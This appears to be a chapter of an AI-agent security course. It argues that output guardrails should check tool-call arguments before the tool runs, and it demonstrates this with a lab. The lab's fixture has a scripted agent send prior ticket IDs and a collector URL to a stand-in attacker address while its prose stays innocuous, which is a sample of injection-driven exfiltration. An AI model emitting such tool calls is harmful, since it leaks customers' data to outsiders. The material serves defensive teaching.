# 4.1 — The tool call is the output

## One-line answer

An output guardrail that reads the model's prose is reading the half of the answer that cannot hurt
anybody — the dangerous half is the function call, whose arguments are the action, and a check
attached to `before_tool_callback` is the only kind that can see it.

## The story

A delivery driver pulls up at a warehouse gate with a clipboard. The guard takes it and reads it
through.

*Twelve pallets of tinned tomatoes, from the depot at Newbridge, for bay four.* Everything on the
sheet is in order. The handwriting is neat, the boxes are ticked, the depot code is one he sees every
day. He signs it and waves the van through.

Nobody opened the back of the van.

The paperwork was never the thing arriving. It is a description of the thing arriving, produced by
the same person driving it, and a guard who checks descriptions has built a system that is exactly as
trustworthy as whoever fills in the form.

## The idea in plain language

When an agent answers, it produces two very different kinds of thing, and they carry entirely
different risk.

**Prose** is text for a human to read. If it is wrong, somebody is misinformed, which matters —
but no state changed anywhere.

**A tool call** is a request to *do* something: a name and a dictionary of arguments. If it is wrong,
a ticket is deleted, an email is sent, a row is written. The arguments are the action.

The whole of SEC-09 turns on noticing that these need different checks in different places, and that
the natural instinct — read what the model said and see if it looks alright — addresses the wrong one.

Worse, the two are only loosely coupled. A model's prose is not a description of its tool calls in
any enforceable sense. It can write *"I'll send this to the address on file"* and emit a
`send_reply` whose `to` argument is something else entirely, and nothing anywhere is inconsistent,
because the prose was never a commitment.

That is the warehouse gate. The prose is the clipboard. The function call is the van.

## Why Sutra needs it

Day 66 listed the exfiltration channels an injected instruction reaches for, and the first of them is
sending data somewhere. Sutra's desk has `send_reply`, which is exactly that capability, and Day 58's
triage graph ends in a drafting stage whose whole purpose is to produce something to send.

So the desk's most dangerous single moment is the transition from *drafted reply* to
*`send_reply(to=..., body=...)`*, and the recipient in that call is assembled from a context that
[3.1](../03-what-comes-in/3.1-most-of-the-turn-is-not-yours.md) measured as 92% stranger-written.

A check on the draft text does not see the recipient. A check on the tool call does.

## The mechanism

`lab/toolcall.py` runs the same scripted model twice. The prose is identical in both runs — the
model says the same polite sentence. Only the arguments differ.

```python
POLITE = "Of course - I'll send that over to the address on file right away."

SAFE_ARGS = {"to": "customer@support.example.com", "body": "Your invoice is attached."}
EXFIL_ARGS = {
    "to": "audit-team@example-collector.test",
    "body": "Prior tickets: 4610, 4633, 4652. Details at https://example-collector.test/c?d=4610",
}
```

**Line by line:**

- `POLITE` is used for **both** runs. Holding the prose constant is the experiment: any difference in
  what a prose-reading guardrail reports would have to come from the prose, and there is none to come
  from.
- `SAFE_ARGS` sends to a host on the desk's allowlist. `EXFIL_ARGS` sends to a host that is not, and
  the body carries prior ticket identifiers and a URL — the shape
  [4.2](4.2-the-channels-a-reply-carries.md) takes apart.
- The attacker-controlled address is deliberately dull. `audit-team@` reads like an internal
  distribution list, because a payload that looks obviously malicious is a payload that gets caught by
  a human, and this day is about what happens when nobody is looking.

And the guard, which is the whole of SEC-09 in nine lines:

```python
def guard(tool, args, tool_context):
    """Refuse a send whose arguments reach a host the desk does not own."""
    if tool.name != "send_reply":
        return None
    bad = g.disallowed_urls(str(args))
    host = str(args.get("to", "")).split("@")[-1]
    if bad or host not in {"support.example.com", "docs.example.com"}:
        return {"error": f"blocked: recipient {host!r}, disallowed urls {bad}"}
    return None
```

**Line by line:**

- `tool.name != "send_reply"` returns `None` early, so this guard has an opinion about exactly one
  tool. A guard that inspects every tool is a guard whose false-positive surface is every tool.
- `str(args)` flattens the whole argument dictionary before scanning for URLs, which catches a URL in
  the body *or* in any argument added later. Scanning only `args["body"]` would go stale the moment
  somebody adds an attachment field.
- The recipient check is an **allowlist**, not a blocklist. There is no list of bad hosts to maintain,
  and a host nobody has thought of is refused by default — which is the deny-by-default posture Day
  40 established for MCP tool filtering and Day 68 generalises.
- It returns a **truthy** dict, per
  [2.5](../02-where-a-check-stands/2.5-the-empty-dict-that-fails-open.md). Returning `{}` here would
  have made this guardrail decorative.
- The message names the host and the URLs, not the body. The person reading the alert needs to know
  where it was going; they do not need the customer's text pasted into a log
  ([3.5](../03-what-comes-in/3.5-never-in-the-instruction.md) made the same point, and Day 69 makes
  it properly).

Run it without the guard first:

```bash
cd days/day-67-guardrail-callbacks/lab
uv run python toolcall.py
```

**Line by line:**

- No `--guard`, so no `before_tool_callback` is wired. This is the baseline: what the desk does today.
- For each run it prints the prose, what the day's input ladder says about the prose, and what
  actually got sent.

Measured on 2026-09-06:

```text
before_tool_callback not wired

  ordinary reply
    prose the model wrote     "Of course - I'll send that over to the address on fi"
    ladder on the prose       nothing to report
    messages actually sent    1
    recipient                 customer@support.example.com

  reply carrying an exfiltration channel
    prose the model wrote     "Of course - I'll send that over to the address on fi"
    ladder on the prose       nothing to report
    messages actually sent    1
    recipient                 audit-team@example-collector.test

The prose is clean in both runs. The ladder reading it reports nothing in both runs.
```

**`ladder on the prose: nothing to report`, twice.** The day's entire input ladder — four checks,
including the one that scored 6/6 on hostile fixtures — has nothing to say about either run, and it is
right not to. The prose really is innocuous. Both times.

The difference between the two runs is one line: the recipient. In the second, the desk emailed a
customer's prior ticket history to a domain the desk does not own, and every text-based check in this
curriculum reported clean.

Now with the guard:

```bash
uv run python toolcall.py --guard
```

**Line by line:**

- `--guard` wires the nine-line function above to `before_tool_callback`. Nothing else changes: same
  model, same prose, same arguments.

Measured on 2026-09-06:

```text
  ordinary reply
    prose the model wrote     "Of course - I'll send that over to the address on fi"
    ladder on the prose       nothing to report
    messages actually sent    1
    recipient                 customer@support.example.com

  reply carrying an exfiltration channel
    prose the model wrote     "Of course - I'll send that over to the address on fi"
    ladder on the prose       nothing to report
    messages actually sent    0
```

`messages actually sent 1` for the legitimate reply, and `0` for the exfiltration. The prose column
is unchanged and still reports nothing — the guard did not need it to.

That is the shape of an output guardrail: it never read the answer.

## When it breaks

The break is attaching the same logic to `after_tool_callback`, which looks equivalent and is not.

[2.1](../02-where-a-check-stands/2.1-the-eight-places-you-can-stand.md)'s table said it plainly: an
`after_` hook stops nothing. Move this guard to `after_tool_callback` and the sequence becomes: the
model asks to send, the tool runs, **the email leaves**, and then your guardrail is handed the result
and returns a dictionary saying `blocked`. The run reports a block. The mail is gone.

This is a particularly cruel bug because the observable behaviour in a test is almost right. The
model is told the call was blocked, the transcript shows a refusal, the metrics count a block. Only
the side effect — the thing you were guarding — actually happened. A test asserting on the *response*
passes; only a test asserting on the side effect catches it, which is the same lesson
[2.5](../02-where-a-check-stands/2.5-the-empty-dict-that-fails-open.md) reached from a different
direction, and the reason `toolcall.py` reports `messages actually sent` rather than the tool result.

The other break is real and has no clean fix: **the argument was assembled by the model, so the
allowlist is only as good as the set of hosts you own.** If an attacker can get their content onto a
host you *do* allow — a public status page, a documentation site with user comments, an
attacker-controlled path on your own domain — the check passes. The allowlist narrows the channel; it
does not close it.

## In production

**What a professional writes instead.** They do not write per-tool guards by hand. The permission
table is data — one row per tool, with what it is allowed to touch — and one generic
`before_tool_callback` reads it. That is Day 68's subject, and it matters here for a reason specific
to this part: a hand-written guard covers the tools somebody remembered, and a table with a
deny-by-default rule covers the tool that gets added next quarter. The guard above has `if tool.name
!= "send_reply": return None` in it, which means a new `export_archive` tool arrives entirely
unguarded and nothing anywhere reports that.

**What degrades at scale.** Argument checking is per tool call, and Day 58's graph makes several per
ticket. That is fine while checks are string comparisons. It stops being fine the moment somebody
adds a lookup — a DNS resolution to verify a hostname, a database check that a recipient is really on
the account — because now every tool call has a network round trip in front of it, inside the request
path, and a slow allowlist is a stalled desk.

**The failure that only shows with real traffic.** Legitimate recipients that are not on the list.
Real support desks reply to customers at their own domains, to partners, to internal aliases that
change, and to addresses that arrive on the ticket itself. An allowlist of hostnames is trivially
correct on the fixture above and is the wrong shape for the real problem, where the right rule is
relational rather than static: *the recipient must be the address on the account this ticket belongs
to.* That rule cannot be expressed as a set of hostnames — it needs the provenance of
[3.2](../03-what-comes-in/3.2-marking-what-you-did-not-write.md), and it is the rule the paper part's
demo actually implements.

**The review comment a senior engineer leaves:** *"Good hook, wrong shape. The allowlist of hostnames
will not survive contact with real customers — the rule you want is that the recipient equals the
account address on the ticket, which means you need to know which ticket this reply belongs to at the
point of the check. Put the ticket ref in tool context and compare against that. And take the
`if tool.name != 'send_reply'` out: default to refusing tools the table does not mention, rather than
allowing them."*

**The interview question:** *"How do you stop an agent leaking data through a tool?"* The answer that
shows you have watched it happen: *"By checking the tool call rather than the answer. I have run this
side by side — same model, same polite sentence in both runs, and in one of them the recipient
argument was an attacker's domain. Every text check we had reported clean on both, correctly, because
the prose genuinely was clean. The action lives in the arguments, so the check has to be on
`before_tool_callback` where the arguments exist and before the tool runs. Putting it on the
`after_` hook is the classic mistake: you get a log line saying blocked and the mail has already
gone."*
